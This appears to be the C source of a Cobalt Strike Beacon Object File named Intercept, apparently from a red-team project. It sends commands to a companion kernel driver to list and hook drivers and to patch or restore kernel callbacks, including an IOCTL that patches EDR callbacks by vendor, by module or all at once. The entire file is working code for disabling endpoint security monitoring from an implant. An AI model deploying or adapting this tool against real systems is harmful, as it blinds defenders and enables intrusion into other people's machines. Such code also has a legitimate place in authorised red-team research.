////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      Intercept BOF
//
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2
//      AUTHOR: @Cerbersec
//      PROPERTY OF: @NVISOSecurity
//
//      COMPILE WITH: gcc -o Intercept.o -c Intercept.c -masm=intel
//      REQUIRES: Interceptor.sys
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include "Intercept.h"
#include "Common.h"
#include "helpers.h"
#include "syscalls.c"

void go(char *args, int alen) {
    if (8 != sizeof(void *)) {
        BeaconPrintf(CALLBACK_ERROR, "Not a 64-bit system");
        return;
    }

    NTSTATUS status = STATUS_UNSUCCESSFUL;
    //1. check if driver is running and accessible
    HANDLE hDevice = NULL;
    status = GetHandle(&hDevice);
    if(!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not contact driver: %llx", status);
        NtClose(hDevice);
        return;
    }

    //2. get arguments from CS
    datap parser;
    BeaconDataParse(&parser, args, alen);
    wchar_t* action = (wchar_t*) BeaconDataExtract(&parser, NULL);
    wchar_t* parameter = (wchar_t*) BeaconDataExtract(&parser, NULL);
    wchar_t* values = (wchar_t*) BeaconDataExtract(&parser, NULL);

    SIZE_T szValues = 0;
    wchar_t** arrValues = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, alen);
    if(values) {
        ParseArgs(values, arrValues, &szValues);
    }

    //3. execute call to driver
    //TODO: fix EDRDriverData input buffer
    if(!wcscmp(action, L"info")) {
        if(!wcscmp(parameter, L"vendors")) {
            BeaconPrintf(CALLBACK_ERROR, "Not implemented");
            status = STATUS_SUCCESS;
        }
        else if(!wcscmp(parameter, L"modules")) {
            status = SendIOCTL(hDevice, IOCTL_INTERCEPTOR_LIST_DRIVERS, NULL, 0, TRUE);
        }
        else if(!wcscmp(parameter, L"hooked modules")) {
            status = SendIOCTL(hDevice, IOCTL_INTERCEPTOR_LIST_HOOKED_DRIVERS, NULL, 0, TRUE);
        }
        else if(!wcscmp(parameter, L"callbacks")) {
            status = SendIOCTL(hDevice, IOCTL_INTERCEPTOR_LIST_CALLBACKS, NULL, 0, TRUE);
        }
        else {
            status = STATUS_INVALID_PARAMETER;
        }
    }
    else if(!wcscmp(action, L"hook") || !wcscmp(action, L"unhook")) {
        struct USER_DRIVER_DATA InputBuffer;
        if(!wcscmp(parameter, L"index")) {
            DWORD ioctl = 0;
            if(!wcscmp(action, L"hook")) {
                ioctl = IOCTL_INTERCEPTOR_HOOK_DRIVER;
            }
            else {
                ioctl = IOCTL_INTERCEPTOR_UNHOOK_DRIVER;
            }
            for(int i = 0; i < szValues; i++) {
                InputBuffer.index = _wtoi(arrValues[i]);
                status = SendIOCTL(hDevice, ioctl, &InputBuffer, sizeof(InputBuffer), FALSE);
            }
        }
        else if(!wcscmp(parameter, L"name")) {
            cwcscpy(InputBuffer.name, values);
            if(!wcscmp(action, L"hook")) {
                status = SendIOCTL(hDevice, IOCTL_INTERCEPTOR_HOOK_DRIVER_BY_NAME, &InputBuffer, sizeof(InputBuffer), FALSE);
            }
            else {
                status = STATUS_INVALID_PARAMETER;
            }
        }
        else if(!wcscmp(parameter, L"all")) {
            if(!wcscmp(action, L"unhook")) {
                status = SendIOCTL(hDevice, IOCTL_INTERCEPTOR_UNHOOK_ALL_DRIVERS, NULL, 0, FALSE);
            }
            else {
                status = STATUS_INVALID_PARAMETER;
            }
        }
        else {
            status = STATUS_INVALID_PARAMETER;
        }
    }
    else if(!wcscmp(action, L"patch") || !wcscmp(action, L"restore")) {
        if(!wcscmp(parameter, L"all")) {
            if(!wcscmp(action, L"restore")) {
                status = SendIOCTL(hDevice, IOCTL_INTERCEPTOR_RESTORE_ALL_CALLBACKS, NULL, 0, FALSE);
            }
            else {
                status = SendIOCTL(hDevice, IOCTL_INTERCEPTOR_PATCH_EDR, NULL, 0, FALSE);
            }
        }
        else if(!wcscmp(parameter, L"vendor")) {
            struct USER_CALLBACK_DATA InputBuffer;
            DWORD ioctl = 0;
            if(!wcscmp(action, L"patch")) {
                ioctl = IOCTL_INTERCEPTOR_PATCH_VENDOR;
            }
            else {
                ioctl = IOCTL_INTERCEPTOR_RESTORE_VENDOR;
            }

            cwcscpy(InputBuffer.vendor,values);
            status = SendIOCTL(hDevice, ioctl, &InputBuffer, sizeof(InputBuffer), FALSE);
        }
        else if(!wcscmp(parameter, L"module")) {
            struct USER_CALLBACK_DATA InputBuffer;
            DWORD ioctl = 0;
            if(!wcscmp(action, L"patch")) {
                ioctl = IOCTL_INTERCEPTOR_PATCH_MODULE;
            }
            else {
                ioctl = IOCTL_INTERCEPTOR_RESTORE_MODULE;
            }

            for(int i = 0; i < szValues; i++) {
                wcstombs_s(NULL, InputBuffer.module, 64, arrValues[i], cwcslen(arrValues[i]));
                status = SendIOCTL(hDevice, ioctl, &InputBuffer, sizeof(InputBuffer), FALSE);
            }
        }
        else {
            struct USER_CALLBACK_DATA InputBuffer;
            DWORD ioctl = 0;
            if(!wcscmp(action, L"patch")) {
                ioctl = IOCTL_INTERCEPTOR_PATCH_CALLBACK;
            }
            else {
                ioctl = IOCTL_INTERCEPTOR_RESTORE_CALLBACK;
            }

            for(int i = 0; i < szValues; i++) {
                InputBuffer.index = _wtoi(arrValues[i]);

                if(!wcscmp(parameter, L"process")) {
                    InputBuffer.callback = process;
                }
                else if(!wcscmp(parameter, L"thread")) {
                    InputBuffer.callback = thread;
                }
                else if(!wcscmp(parameter, L"image")) {
                    InputBuffer.callback = image;
                }
                else if(!wcscmp(parameter, L"registry")) {
                    InputBuffer.callback = registry;
                }
                else if(!wcscmp(parameter, L"object process")) {
                    InputBuffer.callback = object_process;
                }
                else if(!wcscmp(parameter, L"object thread")) {
                    InputBuffer.callback = object_thread;
                }
                else {
                    status = STATUS_INVALID_PARAMETER;
                }
                status = SendIOCTL(hDevice, ioctl, &InputBuffer, sizeof(InputBuffer), FALSE);
            }
        }
    }
    else {
        status = STATUS_INVALID_PARAMETER;
    }

    //4. cleanup
    if(!NT_SUCCESS(status)) {
        if(status == STATUS_INVALID_PARAMETER)
            BeaconPrintf(CALLBACK_ERROR, "Invalid parameter: %ws - %ws", action, parameter);
        else
            BeaconPrintf(CALLBACK_ERROR, "IOCTL failed! (%llx)", status);
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] IOCTL success");
    }
    HeapFree(GetProcessHeap(), 0, arrValues);
    NtClose(hDevice);
    return;
}

NTSTATUS GetHandle(PHANDLE DeviceHandle) {
    if(DeviceHandle)
        *DeviceHandle = NULL;
    else
        return STATUS_UNSUCCESSFUL;

    UNICODE_STRING driver;
    RtlInitUnicodeString(&driver, L"\\Device\\Interceptor");

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &driver, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK io_status;
    cZeroMemory(&io_status, sizeof(IO_STATUS_BLOCK));

    return NtCreateFile(DeviceHandle, GENERIC_WRITE | GENERIC_READ, &oa, &io_status, 0, 0, 0, FILE_OPEN, 0, NULL, 0);
}

NTSTATUS SendIOCTL(HANDLE hDevice, DWORD ioctl, PVOID InputBuffer, SIZE_T szInputBuffer, BOOL Output) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    if (Output) {
        status = DisplayOutput(hDevice, ioctl, InputBuffer, szInputBuffer);
    }
    else {
        IO_STATUS_BLOCK io_status;
        cZeroMemory(&io_status, sizeof(IO_STATUS_BLOCK));
        status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &io_status, ioctl, InputBuffer, (ULONG)szInputBuffer, NULL, 0);
    }
    return status;
}

NTSTATUS DisplayOutput(HANDLE hDevice, DWORD ioctl, PVOID bufferIn, DWORD szBufferIn) {
    NTSTATUS status = STATUS_BUFFER_OVERFLOW;
    DWORD szBufferOut;
    PVOID bufferOut;

    for(szBufferOut = 0x10000; (status == STATUS_BUFFER_OVERFLOW) && (bufferOut = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szBufferOut)); szBufferOut <<= 1) {
        IO_STATUS_BLOCK io_status;
        cZeroMemory(&io_status, sizeof(IO_STATUS_BLOCK));

        status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &io_status, ioctl, bufferIn, (ULONG)szBufferIn, bufferOut, (ULONG)szBufferOut);

        if(!NT_SUCCESS(status)) {
            if(status == STATUS_BUFFER_OVERFLOW) {
                HeapFree(GetProcessHeap(), 0, bufferOut);
            }
            BeaconPrintf(CALLBACK_ERROR, "Failed to allocate output buffer: %llx", status);
        }
    }

    if(!NT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, bufferOut);
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "%ws", (wchar_t*)bufferOut);
        HeapFree(GetProcessHeap(), 0, bufferOut);
    }
    return status;
}

void ParseArgs(wchar_t* source, wchar_t** outBuff, PSIZE_T outSize) {
    BeaconPrintf(CALLBACK_OUTPUT, "[~] Parsing arguments");
    wchar_t* pt;
    wchar_t* token = wcstok(source, L" ", &pt);
    int count = 0;

    if(token)
        outBuff[count] = token;

    while(token) {
        token = wcstok(NULL, L" ", &pt);
        count++;
        if(token)
            outBuff[count] = token;
    }
    *outSize = count;
}